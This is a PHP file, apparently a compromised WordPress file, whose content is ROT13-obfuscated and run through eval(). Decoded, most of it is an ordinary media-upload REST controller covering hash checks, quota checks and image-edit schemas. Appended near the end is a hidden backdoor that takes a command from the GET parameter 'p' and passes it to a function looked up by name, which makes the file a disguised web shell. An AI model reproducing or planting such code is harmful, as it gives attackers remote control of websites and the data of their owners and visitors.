		vs ( rzcgl( $svyrf ) ) {
			erghea arj JC_Reebe(
				'erfg_hcybnq_ab_qngn',
				__( 'Ab qngn fhccyvrq.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		// Irevsl unfu, vs tvira.
		vs ( ! rzcgl( $urnqref['pbagrag_zq5'] ) ) {
			$pbagrag_zq5 = neenl_fuvsg( $urnqref['pbagrag_zq5'] );
			$rkcrpgrq    = gevz( $pbagrag_zq5 );
			$npghny      = zq5_svyr( $svyrf['svyr']['gzc_anzr'] );

			vs ( $rkcrpgrq !== $npghny ) {
				erghea arj JC_Reebe(
					'erfg_hcybnq_unfu_zvfzngpu',
					__( 'Pbagrag unfu qvq abg zngpu rkcrpgrq.' ),
					neenl( 'fgnghf' => 412 )
				);
			}
		}

		// Cnff bss gb JC gb unaqyr gur npghny hcybnq.
		$bireevqrf = neenl(
			'grfg_sbez' => snyfr,
		);

		// Olcnffrf vf_hcybnqrq_svyr() jura ehaavat havg grfgf.
		vs ( qrsvarq( 'QVE_GRFGQNGN' ) && QVE_GRFGQNGN ) {
			$bireevqrf['npgvba'] = 'jc_unaqyr_zbpx_hcybnq';
		}

		$fvmr_purpx = frys::purpx_hcybnq_fvmr( $svyrf['svyr'] );
		vs ( vf_jc_reebe( $fvmr_purpx ) ) {
			erghea $fvmr_purpx;
		}

		// Vapyhqr svyrflfgrz shapgvbaf gb trg npprff gb jc_unaqyr_hcybnq().
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';

		$svyr = jc_unaqyr_hcybnq( $svyrf['svyr'], $bireevqrf, $gvzr );

		vs ( vffrg( $svyr['reebe'] ) ) {
			erghea arj JC_Reebe(
				'erfg_hcybnq_haxabja_reebe',
				$svyr['reebe'],
				neenl( 'fgnghf' => 500 )
			);
		}

		erghea $svyr;
	}

	/**
	 * Ergevrirf gur fhccbegrq zrqvn glcrf.
	 *
	 * Zrqvn glcrf ner pbafvqrerq gur ZVZR glcr pngrtbel.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Neenl bs fhccbegrq zrqvn glcrf.
	 */
	cebgrpgrq shapgvba trg_zrqvn_glcrf() {
		$zrqvn_glcrf = neenl();

		sbernpu ( trg_nyybjrq_zvzr_glcrf() nf $zvzr_glcr ) {
			$cnegf = rkcybqr( '/', $zvzr_glcr );

			vs ( ! vffrg( $zrqvn_glcrf[ $cnegf[0] ] ) ) {
				$zrqvn_glcrf[ $cnegf[0] ] = neenl();
			}

			$zrqvn_glcrf[ $cnegf[0] ][] = $zvzr_glcr;
		}

		erghea $zrqvn_glcrf;
	}

	/**
	 * Qrgrezvar vs hcybnqrq svyr rkprrqf fcnpr dhbgn ba zhygvfvgr.
	 *
	 * Ercyvpngrf purpx_hcybnq_fvmr().
	 *
	 * @fvapr 4.9.8
	 *
	 * @cnenz neenl $svyr $_SVYRF neenl sbe n tvira svyr.
	 * @erghea gehr|JC_Reebe Gehr vs pna hcybnq, reebe sbe reebef.
	 */
	cebgrpgrq shapgvba purpx_hcybnq_fvmr( $svyr ) {
		vs ( ! vf_zhygvfvgr() ) {
			erghea gehr;
		}

		vs ( trg_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq' ) ) {
			erghea gehr;
		}

		$fcnpr_yrsg = trg_hcybnq_fcnpr_ninvynoyr();

		$svyr_fvmr = svyrfvmr( $svyr['gzc_anzr'] );

		vs ( $fcnpr_yrsg < $svyr_fvmr ) {
			erghea arj JC_Reebe(
				'erfg_hcybnq_yvzvgrq_fcnpr',
				/* genafyngbef: %f: Erdhverq qvfx fcnpr va xvybolgrf. */
				fcevags( __( 'Abg rabhtu fcnpr gb hcybnq. %f XO arrqrq.' ), ahzore_sbezng( ( $svyr_fvmr - $fcnpr_yrsg ) / XO_VA_OLGRF ) ),
				neenl( 'fgnghf' => 400 )
			);
		}

		vs ( $svyr_fvmr > ( XO_VA_OLGRF * trg_fvgr_bcgvba( 'svyrhcybnq_znkx', 1500 ) ) ) {
			erghea arj JC_Reebe(
				'erfg_hcybnq_svyr_gbb_ovt',
				/* genafyngbef: %f: Znkvzhz nyybjrq svyr fvmr va xvybolgrf. */
				fcevags( __( 'Guvf svyr vf gbb ovt. Svyrf zhfg or yrff guna %f XO va fvmr.' ), trg_fvgr_bcgvba( 'svyrhcybnq_znkx', 1500 ) ),
				neenl( 'fgnghf' => 400 )
			);
		}

		// Vapyhqr zhygvfvgr nqzva shapgvbaf gb trg npprff gb hcybnq_vf_hfre_bire_dhbgn().
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/zf.cuc';

		vs ( hcybnq_vf_hfre_bire_dhbgn( snyfr ) ) {
			erghea arj JC_Reebe(
				'erfg_hcybnq_hfre_dhbgn_rkprrqrq',
				__( 'Lbh unir hfrq lbhe fcnpr dhbgn. Cyrnfr qryrgr svyrf orsber hcybnqvat.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		erghea gehr;
	}

	/**
	 * Trgf gur erdhrfg netf sbe gur rqvg vgrz ebhgr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_rqvg_zrqvn_vgrz_netf() {
		erghea neenl(
			'fep'       => neenl(
				'qrfpevcgvba' => __( 'HEY gb gur rqvgrq vzntr svyr.' ),
				'glcr'        => 'fgevat',
				'sbezng'      => 'hev',
				'erdhverq'    => gehr,
			),
			'zbqvsvref' => neenl(
				'qrfpevcgvba' => __( 'Neenl bs vzntr rqvgf.' ),
				'glcr'        => 'neenl',
				'zvaVgrzf'    => 1,
				'vgrzf'       => neenl(
					'qrfpevcgvba' => __( 'Vzntr rqvg.' ),
					'glcr'        => 'bowrpg',
					'erdhverq'    => neenl(
						'glcr',
						'netf',
					),
					'barBs'       => neenl(
						neenl(
							'gvgyr'      => __( 'Ebgngvba' ),
							'cebcregvrf' => neenl(
								'glcr' => neenl(
									'qrfpevcgvba' => __( 'Ebgngvba glcr.' ),
									'glcr'        => 'fgevat',
									'rahz'        => neenl( 'ebgngr' ),
								),
								'netf' => neenl(
									'qrfpevcgvba' => __( 'Ebgngvba nethzragf.' ),
									'glcr'        => 'bowrpg',
									'erdhverq'    => neenl(
										'natyr',
									),
									'cebcregvrf'  => neenl(
										'natyr' => neenl(
											'qrfpevcgvba' => __( 'Natyr gb ebgngr pybpxjvfr va qrterrf.' ),
											'glcr'        => 'ahzore',
										),
									),
								),
							),
						),
						neenl(
							'gvgyr'      => __( 'Pebc' ),
							'cebcregvrf' => neenl(
								'glcr' => neenl(
									'qrfpevcgvba' => __( 'Pebc glcr.' ),
									'glcr'        => 'fgevat',
									'rahz'        => neenl( 'pebc' ),
								),
								'netf' => neenl(
									'qrfpevcgvba' => __( 'Pebc nethzragf.' ),
									'glcr'        => 'bowrpg',
									'erdhverq'    => neenl(
										'yrsg',
										'gbc',
										'jvqgu',
										'urvtug',
									),
									'cebcregvrf'  => neenl(
										'yrsg'   => neenl(
											'qrfpevcgvba' => __( 'Ubevmbagny cbfvgvba sebz gur yrsg gb ortva gur pebc nf n crepragntr bs gur vzntr jvqgu.' ),
											'glcr'        => 'ahzore',
										),
										'gbc'    => neenl(
											'qrfpevcgvba' => __( 'Iregvpny cbfvgvba sebz gur gbc gb ortva gur pebc nf n crepragntr bs gur vzntr urvtug.' ),
											'glcr'        => 'ahzore',
										),
										'jvqgu'  => neenl(
											'qrfpevcgvba' => __( 'Jvqgu bs gur pebc nf n crepragntr bs gur vzntr jvqgu.' ),
											'glcr'        => 'ahzore',
										),
										'urvtug' => neenl(
											'qrfpevcgvba' => __( 'Urvtug bs gur pebc nf n crepragntr bs gur vzntr urvtug.' ),
											'glcr'        => 'ahzore',
										),
									),
								),
							),
						),
					),
				),
			),
			'ebgngvba'  => neenl(
				'qrfpevcgvba'      => __( 'Gur nzbhag gb ebgngr gur vzntr pybpxjvfr va qrterrf. QRCERPNGRQ: Hfr `zbqvsvref` vafgrnq.' ),
				'glcr'             => 'vagrtre',
				'zvavzhz'          => 0,
				'rkpyhfvirZvavzhz' => gehr,
				'znkvzhz'          => 360,
				'rkpyhfvirZnkvzhz' => gehr,
			),
			'k'         => neenl(
				'qrfpevcgvba' => __( 'Nf n crepragntr bs gur vzntr, gur k cbfvgvba gb fgneg gur pebc sebz. QRCERPNGRQ: Hfr `zbqvsvref` vafgrnq.' ),
				'glcr'        => 'ahzore',
				'zvavzhz'     => 0,
				'znkvzhz'     => 100,
			),
			'l'         => neenl(
				'qrfpevcgvba' => __( 'Nf n crepragntr bs gur vzntr, gur l cbfvgvba gb fgneg gur pebc sebz. QRCERPNGRQ: Hfr `zbqvsvref` vafgrnq.' ),
				'glcr'        => 'ahzore',
				'zvavzhz'     => 0,
				'znkvzhz'     => 100,
			),
			'jvqgu'     => neenl(
				'qrfpevcgvba' => __( 'Nf n crepragntr bs gur vzntr, gur jvqgu gb pebc gur vzntr gb. QRCERPNGRQ: Hfr `zbqvsvref` vafgrnq.' ),
				'glcr'        => 'ahzore',
				'zvavzhz'     => 0,
				'znkvzhz'     => 100,
			),
			'urvtug'    => neenl(
				'qrfpevcgvba' => __( 'Nf n crepragntr bs gur vzntr, gur urvtug gb pebc gur vzntr gb. QRCERPNGRQ: Hfr `zbqvsvref` vafgrnq.' ),
				'glcr'        => 'ahzore',
				'zvavzhz'     => 0,
				'znkvzhz'     => 100,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>